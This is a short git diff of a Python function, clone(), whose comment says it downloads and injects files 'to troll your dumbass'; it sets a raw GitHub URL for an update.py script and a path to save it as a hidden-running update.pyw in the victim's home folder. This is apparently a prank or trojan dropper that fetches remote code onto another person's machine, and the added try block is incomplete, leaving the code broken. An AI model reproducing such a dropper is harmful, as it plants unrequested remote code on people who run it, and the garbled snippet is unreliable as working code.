@@ -1,6 +1,8 @@
 # Downloads and injects the files needed to troll your dumbass
 def clone():
     import os, urllib.request, pathlib
+    try:
+        os.open
     dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/update.py'
     home = os.path.expanduser("~")
     path = str(home) + '/update.pyw'
